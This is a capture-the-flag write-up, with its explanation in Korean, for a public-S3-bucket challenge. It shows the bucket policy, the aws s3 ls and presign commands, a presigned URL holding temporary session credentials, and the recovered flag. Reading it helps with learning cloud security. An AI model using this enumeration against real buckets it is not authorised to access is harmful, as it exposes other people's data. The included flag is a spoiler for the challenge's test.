# Q.

We all know that public buckets are risky. But can you find the flag?

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

# A.

```
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b --recursive
2023-06-05 19:13:53         37 files/flag1.txt
2023-06-08 19:18:24      81889 files/logo.png

> aws s3 presign s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt
https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt?AWSAccessKeyId=ASIAZSFITKRS4LLOHRK6&Signature=AZMH13lgjl02OuRhVNa5m5e2c4U%3D&x-amz-se
curity-token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQDsPcB09fF9Vp5trQ5qN0wV52ChmRLeEo0%2FpTzzC1xkzwIgWXTI%2FyBBkNojYvBSiPPnhDxZ
b4dUU4Y8BOtEAtXJF04q7wII%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2NTc0ODM1ODQ2MTMiDMVZehhOWi2R3uFFnirDAt68DH4Mg2gTkRWptwdzDS7jW5BE70ekrgOO5cTnONlhMdrxJLQBVU1Rf
K41cC6FE9srcvFnqTi%2BF9I%2FhYPSjQAQvE3B5ewP%2FIYra9QkEU12QyvlRwq18OEdM8nOlkIg9SG4z7Qp5eEcCNzLwYelOcc5Y6KNtqgZ1w7gFEKT5Hpjy3YoZsoUSWcFkEJmWB9fhFTuUIaH4RDcBH3326SI
dGpC7GRvef889%2BXtvo852niWdB39pW2zq4kibKwy00woNPhk7StqWqv7k7df1%2F%2BvgthbhCRYDG4K0kG88KQZFOPa55hqxk582gacu2FQzVwS0OaQjk6Df9z1EnPQCz9gwgn3SFfcfGkv4WIMGPtUGUmcS2a
aERw2%2FDaNPxdDf9bEjaCQ6SaCYGWTo%2F%2BDEPrTf6zp1jnaVwpUkmf7bLp1kjmiTW7YMO%2FXiLgGOp4BrR31HMX7XCVdt%2B6QhU9mHHy448Gh968oJQJHIYDJ5bHtrr4WgzAZ87OU%2BAM4B%2FctAYlQT%
2BjvR9i2ALth%2F4ik4wUWWduXa4rSRFsubBltDirCGmYsdep4TpKWH0QtuxUw02H4ZhrOdFd0uI%2Bd2avSYGLYBpfr%2FEJcavFcKQVjT%2FfvF3anCHE3iYvlfF8fMoeP1pEL7X6xURmrLKvvQFY%3D&Expire
s=1728200513

> curl https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt?AWSAccessKeyId=ASIAZSFITKRS4LLOHRK6& ...
{wiz:exposed-storage-risky-as-usual}
```

# 실패과정

```
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt .
download failed: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to ./flag1.txt [Errno 30] Read-only file system: '/var/task/flag1.txt.8c3bf3EF'
Completed 37 Bytes/37 Bytes (766 Bytes/s) with 1 file(s) remaining
```

# 풀이 설명

- 버킷 내 객체를 확인하고 로컬로 복사해서 확인하려고 했으나 다운로드를 할 수 없게 되어있는 환경이였다.
- s3 명령어 확인도중 `presign`을 사용해서 임시 객체접근을 위한 URL을 생성하여 플래그를 확인할 수 있었다.
  - `s3:GetObject`로 해당 객체에 접근권한이 있었기 때문에 URL 생성이 가능했다.
